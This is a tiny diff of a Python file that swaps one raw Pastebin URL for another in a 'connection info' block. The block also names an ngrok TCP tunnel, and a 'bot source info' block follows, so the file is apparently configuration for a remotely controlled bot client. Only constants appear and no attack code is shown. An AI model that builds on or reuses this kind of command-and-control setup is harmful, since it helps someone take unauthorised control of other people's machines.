@@ -12,7 +12,7 @@ from time import sleep
 
 # CONNECTION INFO
 ip = "0.tcp.ngrok.io"
-pastebin = "https://pastebin.com/raw/tDRcpFbq"
+pastebin = "https://pastebin.com/raw/mwAqyRid"
 
 # BOT SOURCE INFO
 myname = ".demp.ov"
